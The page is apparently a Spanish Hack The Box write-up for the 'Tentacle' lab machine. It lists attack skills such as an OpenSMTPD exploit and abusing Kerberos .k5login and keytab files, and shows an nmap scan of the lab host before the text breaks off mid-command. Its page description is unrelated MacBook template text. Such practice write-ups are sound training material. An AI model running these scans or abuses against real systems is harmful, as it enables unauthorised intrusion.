<!DOCTYPE html><html lang="en" class="scroll-smooth" data-astro-cid-37fxchfa> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v4.0.8"><!-- Canonical URL --><link rel="canonical" href="https://blog-template-gray.vercel.app/post/tentacle/"><!-- Primary Meta Tags --><title>Tentacle - HTB Writeup • Full Blog</title><!-- ViewTransitions  --><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><!-- SEO --><meta name="title" content="Tentacle - HTB Writeup • Full Blog"><meta name="description" content="The new MacBook Pro 2022 is here. With the Apple M2 chip, a new design, and more, the new MacBook Pro is the best laptop Apple has ever made."><meta name="author" content="Fullaw4ke"><!-- Open Graph / Facebook --><meta property="og:type" content="article"><meta property="og:url" content="https://blog-template-gray.vercel.app/post/tentacle/"><meta property="og:title" content="Tentacle - HTB Writeup"><meta property="og:description" content="The new MacBook Pro 2022 is here. With the Apple M2 chip, a new design, and more, the new MacBook Pro is the best laptop Apple has ever made."><meta property="og:image" content="https://blog-template-gray.vercel.app/_astro/image.Zo4NWcZv.png"><meta property="article:author" content="Fullaw4ke"><meta property="article:published_time" content="2022-07-02T04:00:00.000Z"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://blog-template-gray.vercel.app/post/tentacle/"><meta property="twitter:title" content="Tentacle - HTB Writeup"><meta property="twitter:description" content="The new MacBook Pro 2022 is here. With the Apple M2 chip, a new design, and more, the new MacBook Pro is the best laptop Apple has ever made."><meta property="twitter:image" content="https://blog-template-gray.vercel.app/_astro/image.Zo4NWcZv.png"><!-- RSS auto-discovery --><link rel="alternate" type="application/rss+xml" title="Full Blog" href="/rss.xml"><link as="font" crossorigin rel="preload" href="/fonts/Manrope-Bold.woff2" type="font/woff2"><style>@font-face {font-weight: 200;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-ExtraLight.woff2)}</style><style>@font-face {font-weight: 300;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Light.woff2)}</style><style>@font-face {font-weight: 400;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Regular.woff2)}</style><style>@font-face {font-weight: 500;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Medium.woff2)}</style><style>@font-face {font-weight: 600;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-SemiBold.woff2)}</style><style>@font-face {font-weight: 700;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Bold.woff2)}</style><style>@font-face {font-weight: 800;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-ExtraBold.woff2)}</style><style>@font-face { font-family: _font_fallback_1728617367609; size-adjust: 103.76%; src: local('Arial'); ascent-override: 102.74%; descent-override: 28.91%; line-gap-override: 0.00%; }</style><script>
	function getTheme() {
		const storedTheme = typeof localStorage !== 'undefined' && localStorage.getItem('theme')

		return (
			storedTheme || (window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark')
		)
	}

	function setTheme(newTheme) {
		const html = document.documentElement
		const isDark = newTheme === 'dark'

		html.classList.toggle('dark', isDark)
		html.classList.toggle('light', !isDark)

		localStorage.setItem('theme', newTheme)
	}

	// set initial theme
	setTheme(getTheme())
	document.addEventListener('astro:after-swap', () => setTheme(getTheme()))

	document.addEventListener('theme-change', (e) => {
		setTheme(e.detail.theme)
	})
</script><script>
	if (!('animations' in localStorage)) {
		localStorage.setItem('animations', 'true')
	} else {
		localStorage.setItem('animations', 'false')
	}
</script><link rel="stylesheet" href="/_astro/_page_.oLAkEadO.css" />
<link rel="stylesheet" href="/_astro/_slug_.m5WJ7WE5.css" /><script type="module" src="/_astro/hoisted.cZ5bdfWX.js"></script></head> <body class="bg-white text-stone-950 dark:bg-[#0a0910] dark:text-white" data-astro-cid-37fxchfa> <main class="px-5 sm:mx-auto sm:max-w-2xl sm:px-8 lg:px-0 antialiased md:max-w-6xl grid gap-12 mt-4 overflow-hidden md:overflow-visible" data-astro-cid-37fxchfa> <header class="relative flex items-center h-12 font-semibold"> <a class="text-lg mr-auto" href="/">Home</a> <div id="astro-header-drawer" class="shadow rounded-l-lg md:bg-transparent dark:md:bg-transparent bg-white dark:bg-[#0a0910] md:shadow-none md:rounded-none md:border-none md:h-auto md:static absolute transition-transform duration-300 ease-in translate-x-96 md:translate-x-0 top-12 -right-5 pl-4 pt-6 pb-4 md:p-0 h-[200px] w-[200px] z-50"> <nav class="flex h-full flex-col justify-between gap-12 text-left md:flex-row md:w-full md:gap-5"> <div class="flex flex-col gap-4 md:flex-row md:border-r-2 border-black pr-4 dark:border-white"> <a href="/tags" class="text-opacity-60 flex items-center gap-1 text-2xl md:text-base" rel="noopener noreferrer ">  <svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M7.859 6h-2.834a2.025 2.025 0 0 0 -2.025 2.025v2.834c0 .537 .213 1.052 .593 1.432l6.116 6.116a2.025 2.025 0 0 0 2.864 0l2.834 -2.834a2.025 2.025 0 0 0 0 -2.864l-6.117 -6.116a2.025 2.025 0 0 0 -1.431 -.593z"></path> <path d="M17.573 18.407l2.834 -2.834a2.025 2.025 0 0 0 0 -2.864l-7.117 -7.116"></path> <path d="M6 9h-.01"></path> </svg> Tags
 </a> </div> <div class="flex justify-center items-center md:justify-end gap-3 md:p-0"> <a href="https://github.com/fullaw4ke" class="text-opacity-60" rel="noopener noreferrer " target="_blank" aria-label="Github">  <span><svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path> </svg> </span>  </a><a href="https://x.com/fullaw4ke" class="text-opacity-60" rel="noopener noreferrer " target="_blank" aria-label="Twitter">  <span><svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c0 -.249 1.51 -2.772 1.818 -4.013z"></path> </svg> </span>  </a> </div> </nav> </div> <div class="flex items-center gap-3 md:pl-3" data-astro-transition-persist="navbar"> <div> <site-search id="search" class="ms-auto"> <button data-open-modal disabled class="flex items-center justify-center rounded-md gap-1"> <svg aria-label="search" class="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"> <path stroke="none" d="M0 0h24v24H0z"></path> <path d="M3 10a7 7 0 1 0 14 0 7 7 0 1 0-14 0M21 21l-6-6"></path> </svg> <!-- <span class='md:hidden text-2xl'> Search</span> --> </button> <dialog aria-label="search" class="h-full max-h-full w-full max-w-full border border-zinc-400 bg-white dark:bg-[#0a0910ec] shadow backdrop:backdrop-blur sm:mx-auto sm:mb-auto sm:mt-16 sm:h-max sm:max-h-[calc(100%-8rem)] sm:min-h-[15rem] sm:w-5/6 sm:max-w-[48rem] sm:rounded-md opacity-0"> <div class="dialog-frame flex flex-col gap-4 p-6 pt-12 sm:pt-6"> <button data-close-modal class="ms-auto cursor-pointer rounded-full bg-black text-white px-4 py-2 dark:bg-white dark:text-black">Close</button> <div class="search-container dark:text-white"> <div id="pagefind__search"></div> </div> </div> </dialog> </site-search>   </div>  <theme-toggle class="relative h-6 w-6"> <button id="toggle-theme" class="group" aria-label="Toggle Theme"> <span class="absolute left-0 right-0 top-0 opacity-0 group-aria-pressed:opacity-100"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-sun-high" width="24" height="24" viewBox="0 0 24 24" stroke-width="1" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z"></path> <path d="M6.343 17.657l-1.414 1.414"></path> <path d="M6.343 6.343l-1.414 -1.414"></path> <path d="M17.657 6.343l1.414 -1.414"></path> <path d="M17.657 17.657l1.414 1.414"></path> <path d="M4 12h-2"></path> <path d="M12 4v-2"></path> <path d="M20 12h2"></path> <path d="M12 20v2"></path> </svg> </span> <span class="absolute left-0 right-0 top-0 opacity-0 group-aria-[pressed=false]:opacity-100"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon" width="24" height="24" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path> </svg> </span> </button> </theme-toggle> <script>
	const button = document.getElementById('toggle-theme')

	function setButtonPresssed() {
		const bodyThemeIsDark = document.documentElement.classList.contains('dark')
		button.setAttribute('aria-pressed', String(bodyThemeIsDark))
	}
	setButtonPresssed()
</script> <button id="astro-header-drawer-button" type="button" class="md:ml-6 md:hidden"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu-2" width="24" height="24" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M4 6l16 0"></path> <path d="M4 12l16 0"></path> <path d="M4 18l16 0"></path> </svg> <span class="sr-only">Show Menu</span> </button> </div> </header>   <article class="min-w-full md:py-4 sm:max-w-none md:max-w-none"> <header class="mb-3 flex flex-col justify-center items-center gap-6"> <div class="flex flex-col gap-2"> <div class="flex items-center justify-center gap-x-1"> <p class="text-center text-sm text-opacity-50">
Published <time class="text-sm font-bold text-opacity-60" datetime="2022-07-02T04:00:00.000Z"> Jul 2, 2022 </time> </p> <p class="text-center text-sm text-opacity-50 font-bold">
- 13 min read </p> </div> <h1 class="text-center text-4xl md:text-6xl md:pb-2.5 font-semibold"> Tentacle - HTB Writeup </h1> </div> <div class="flex flex-wrap justify-center items-center gap-2 gap-y-4 md:gap-5"> <a href="/tags/hard" aria-label="Hard"> <span class="bg-indigo-600 font-semibold text-white dark:bg-indigo-900 dark:text-white shadow text-sm w-fit px-2 py-1 md:px-5 md:py-2 rounded-full"> Hard </span> </a><a href="/tags/linux" aria-label="Linux"> <span class="bg-indigo-600 font-semibold text-white dark:bg-indigo-900 dark:text-white shadow text-sm w-fit px-2 py-1 md:px-5 md:py-2 rounded-full"> Linux </span> </a> </div> </header> <img src="/_astro/image.Zo4NWcZv_Z1ltI7V.jpg" loading="eager" class="rounded-md w-full max-h-[300px]  md:max-h-[500px] my-8 object-cover" alt="img of Tentacle - HTB Writeup" width="1000" height="500" decoding="async"> <hr> <div>  <div class="grid grid-cols-1 md:grid-cols-[20%_auto] gap-10 mt-8"> <!-- aside  --> <aside class="md:flex flex-col gap-8 hidden"> <div class="flex flex-col gap-2"> <span class="mb-1 font-bold text-2xl">Share</span> <ul class="flex gap-3 text-black dark:text-white"> <li> <a href="https://twitter.com/intent/tweet?text=Share this post https://blog-template-gray.vercel.app/post/tentacle/" aria-label="Share on Twitter"><!--?xml version="1.0" ?--><svg height="32px" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:2;" version="1.1" viewBox="0 0 512 512" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g><path d="M448,512l-384,0c-35.328,0 -64,-28.672 -64,-64l0,-384c0,-35.328 28.672,-64 64,-64l384,0c35.328,0 64,28.672 64,64l0,384c0,35.328 -28.672,64 -64,64Z" id="Dark_Blue" style="fill:#1da1f2;fill-rule:nonzero;"></path><path d="M196.608,386.048c120.704,0 186.752,-100.096 186.752,-186.752c0,-2.816 0,-5.632 -0.128,-8.448c12.8,-9.216 23.936,-20.864 32.768,-34.048c-11.776,5.248 -24.448,8.704 -37.76,10.368c13.568,-8.064 23.936,-20.992 28.928,-36.352c-12.672,7.552 -26.752,12.928 -41.728,15.872c-12.032,-12.8 -29.056,-20.736 -47.872,-20.736c-36.224,0 -65.664,29.44 -65.664,65.664c0,5.12 0.64,10.112 1.664,14.976c-54.528,-2.688 -102.912,-28.928 -135.296,-68.608c-5.632,9.728 -8.832,20.992 -8.832,33.024c0,22.784 11.648,42.88 29.184,54.656c-10.752,-0.384 -20.864,-3.328 -29.696,-8.192l0,0.896c0,31.744 22.656,58.368 52.608,64.384c-5.504,1.536 -11.264,2.304 -17.28,2.304c-4.224,0 -8.32,-0.384 -12.288,-1.152c8.32,26.112 32.64,45.056 61.312,45.568c-22.528,17.664 -50.816,28.16 -81.536,28.16c-5.248,0 -10.496,-0.256 -15.616,-0.896c28.928,18.432 63.488,29.312 100.48,29.312" id="Logo__x2014__FIXED" style="fill:#fff;fill-rule:nonzero;"></path></g></svg></a> </li> <li> <a href="https://www.linkedin.com/shareArticle?mini=true&#38;url=https://blog-template-gray.vercel.app/post/tentacle/" aria-label="Share on LinkedIn"> <svg enable-background="new 0 0 32 32" height="32px" id="Layer_1" version="1.0" viewBox="0 0 32 32" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g><path d="M32,30c0,1.104-0.896,2-2,2H2c-1.104,0-2-0.896-2-2V2c0-1.104,0.896-2,2-2h28c1.104,0,2,0.896,2,2V30z" fill="#007BB5"></path><g><rect fill="#FFFFFF" height="14" width="4" x="7" y="11"></rect><path d="M20.499,11c-2.791,0-3.271,1.018-3.499,2v-2h-4v14h4v-8c0-1.297,0.703-2,2-2c1.266,0,2,0.688,2,2v8h4v-7    C25,14,24.479,11,20.499,11z" fill="#FFFFFF"></path><circle cx="9" cy="8" fill="#FFFFFF" r="2"></circle></g></g><g></g><g></g><g></g><g></g><g></g><g></g></svg></a> </li> </ul> </div> <div class="sticky top-24 self-start hidden md:block transition-all duration-200"> <nav class="max-w-xs dark:text-black"> <p class="font-bold mb-3 text-2xl dark:text-white">Index</p> <ul class="[text-wrap:balance] flex flex-col gap-1"> <li class="flex flex-col"> <a href="#skills" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Skills </a>  </li><li class="flex flex-col"> <a href="#information-gathering" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Information Gathering </a>  </li><li class="flex flex-col"> <a href="#enumeration" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Enumeration </a>  </li><li class="flex flex-col"> <a href="#port-53---dns" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Port 53 - DNS </a>  </li><li class="flex flex-col"> <a href="#port-3128---http-proxy-squid" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Port 3128 - HTTP-Proxy (Squid) </a>  </li><li class="flex flex-col"> <a href="#accessing-internal-resources" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Accessing internal resources </a>  </li><li class="flex flex-col"> <a href="#wpad-server" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> WPAD server </a>  </li><li class="flex flex-col"> <a href="#explotation" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Explotation </a>  </li><li class="flex flex-col"> <a href="#lateral-movement" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Lateral Movement </a>  </li><li class="flex flex-col"> <a href="#investigando-la-autenticación-ssh-usando-gssapi" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Investigando la autenticación SSH usando gssapi </a>  </li><li class="flex flex-col"> <a href="#configuración-de-la-autenticación-kerberos" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Configuración de la autenticación Kerberos </a>  </li><li class="flex flex-col"> <a href="#ssh-using-kerberos" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> SSH using Kerberos </a>  </li><li class="flex flex-col"> <a href="#lateral-movement-2" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Lateral Movement #2 </a>  </li><li class="flex flex-col"> <a href="#privilege-escalation" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Privilege escalation </a>  </li> </ul> </nav> </div> </aside> <!-- post --> <article class="max-w-full w-full"> <div class="prose prose-lg md:prose-xl dark:prose-invert mb-12 min-w-full"> <h1 id="skills">Skills</h1>
<ul>
<li>DNS Enumeration (dnsenum)</li>
<li>SQUID Proxy</li>
<li>WPAD Enumeration</li>
<li>OpenSMTPD v2.0.0 Exploit</li>
<li>SSH using Kerberos (gssapi)</li>
<li>Abusing .k5login file</li>
<li>Abusing krb5.keytab file</li>
</ul>
<h1 id="information-gathering">Information Gathering</h1>
<p>Primero el ping de siempre a la IP de la maquina victima:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">ping</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -c</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.10.224</span><span style="color:#393A34;--shiki-dark:#BABED8"> </span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">PING</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.10.224</span><span style="color:#393A34;--shiki-dark:#BABED8"> (10.10.10.224) 56</span><span style="color:#999999;--shiki-dark:#89DDFF">(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">84</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span><span style="color:#393A34;--shiki-dark:#BABED8"> bytes of data.</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">64</span><span style="color:#B56959;--shiki-dark:#C3E88D"> bytes</span><span style="color:#B56959;--shiki-dark:#C3E88D"> from</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.10.224:</span><span style="color:#B56959;--shiki-dark:#C3E88D"> icmp_seq=</span><span style="color:#2F798A;--shiki-dark:#F78C6C">1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ttl=</span><span style="color:#2F798A;--shiki-dark:#F78C6C">63</span><span style="color:#B56959;--shiki-dark:#C3E88D"> time=</span><span style="color:#2F798A;--shiki-dark:#F78C6C">133</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ms</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">---</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.10.224</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ping</span><span style="color:#B56959;--shiki-dark:#C3E88D"> statistics</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> ---</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> packets</span><span style="color:#B56959;--shiki-dark:#C3E88D"> transmitted,</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#B56959;--shiki-dark:#C3E88D"> received,</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 0</span><span style="color:#B56959;--shiki-dark:#C3E88D">%</span><span style="color:#B56959;--shiki-dark:#C3E88D"> packet</span><span style="color:#B56959;--shiki-dark:#C3E88D"> loss,</span><span style="color:#B56959;--shiki-dark:#C3E88D"> time</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 0</span><span style="color:#B56959;--shiki-dark:#C3E88D">ms</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">rtt</span><span style="color:#B56959;--shiki-dark:#C3E88D"> min/avg/max/mdev</span><span style="color:#B56959;--shiki-dark:#C3E88D"> =</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 133.304</span><span style="color:#B56959;--shiki-dark:#C3E88D">/133.304/133.304/0.000</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ms</span></span></code></pre> 
<p>Iniciamos nuestro escaneo de puertos con nmap:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">sudo</span><span style="color:#B56959;--shiki-dark:#C3E88D"> nmap</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -sS</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -p-</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --open</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --min-rate</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 4000</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -n</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -Pn</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 10.10</span><span style="color:#B56959;--shiki-dark:#C3E88D">.10.224</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -oG</span><span style="color:#B56959;--shiki-dark:#C3E88D"> nmap</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">PORT</span><span style="color:#B56959;--shiki-dark:#C3E88D">     STATE</span><span style="color:#B56959;--shiki-dark:#C3E88D"> SERVICE</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">22/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D">   open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  ssh</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">53/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D">   open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  domain</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">88/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D">   open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  kerberos-sec</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">3128/tcp</span><span style="color:#B56959;--shiki-dark:#C3E88D"> open</span><span style="color:#B56959;--shiki-dark:#C3E88D">  squid-http</span></span></code></pre> 
<p>Copiamos los puertos en la clipboard para realizar escaneo de versiones:</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">ports</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF">$(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">cat</span><span style="color:#B56959;--shiki-dark:#C3E88D"> nmap </span><span style="color:#AB5959;--shiki-dark:#89DDFF">|</span><span 